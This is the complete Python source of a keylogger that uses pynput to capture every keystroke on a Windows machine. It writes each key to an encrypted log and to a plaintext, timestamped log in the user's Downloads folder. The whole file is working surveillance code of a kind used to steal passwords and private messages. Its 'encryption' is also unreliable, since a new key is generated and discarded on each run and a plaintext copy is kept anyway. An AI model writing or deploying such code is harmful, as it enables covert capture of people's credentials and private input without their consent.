from pynput.keyboard import Key, Listener
from cryptography.fernet import Fernet
import logging
from datetime import datetime
import sys

# Generate a key for encryption (run this once and save it securely)
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# Use raw strings for file paths
log_directory = r"C:\Users\DELL\Downloads"
encrypted_log_file = log_directory + "\\log_encrypted.txt"
decrypted_log_file = log_directory + "\\log_decrypted.txt"

# Configure logging to log encrypted messages
logging.basicConfig(
    filename=encrypted_log_file,
    level=logging.DEBUG,
    format='%(asctime)s: %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

# Notify the user that the keylogger has started (console only)
if __name__ == "__main__":
    print("Keylogger is ON. Press Esc to stop it.")

def encrypt_log(message):
    """Encrypt log message before saving to the encrypted file."""
    return cipher_suite.encrypt(message.encode('utf-8')).decode('utf-8')

def on_press(key):
    try:
        # Prepare the log message based on the key pressed
        if hasattr(key, 'char') and key.char is not None:
            log_message = f"Key pressed: {key.char}"
        elif key == Key.space:
            log_message = "Key pressed: [Space]"
        elif key == Key.enter:
            log_message = "Key pressed: [Enter]"
        elif key == Key.backspace:
            log_message = "Key pressed: [Backspace]"
        elif key == Key.tab:
            log_message = "Key pressed: [Tab]"
        elif key == Key.cmd:  # Detect the Windows key
            log_message = "Key pressed: [Windows]"
        elif key == Key.alt_l or key == Key.alt_r:  # Detect Alt key
            log_message = "Key pressed: [Alt]"
        elif key == Key.ctrl_l or key == Key.ctrl_r:  # Detect Ctrl key
            log_message = "Key pressed: [Ctrl]"
        else:
            log_message = f"Key pressed: [{key.name}]"
        
        # Encrypt the message for the encrypted file
        encrypted_message = encrypt_log(log_message)
        logging.info(encrypted_message)  # Log the encrypted message to the encrypted file

        # Add timestamp for the decrypted log
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        decrypted_message = f"{timestamp} - {log_message}"
        
        # Log the plain text (decrypted) message to the decrypted file
        with open(decrypted_log_file, 'a') as decrypted_file:
            decrypted_file.write(f"{decrypted_message}\n")  # Write plain message with timestamp

    except AttributeError:
        log_message = "Key pressed: [Unknown]"
        encrypted_message = encrypt_log(log_message)
        logging.info(encrypted_message)

        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        decrypted_message = f"{timestamp} - {log_message}"
        
        with open(decrypted_log_file, 'a') as decrypted_file:
            decrypted_file.write(f"{decrypted_message}\n")

def on_release(key):
    # Stop listener if Esc key is pressed
    if key == Key.esc:
        print("Keylogger is closed")
        return False

# Start the listener and handle Ctrl + C gracefully
try:
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
except KeyboardInterrupt:
    # Handle Ctrl + C (stop keylogger without raising an exception)
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    with open(decrypted_log_file, 'a') as decrypted_file:
        decrypted_file.write(f"{timestamp} - Keylogger is closed .\n")  # Log closure
   
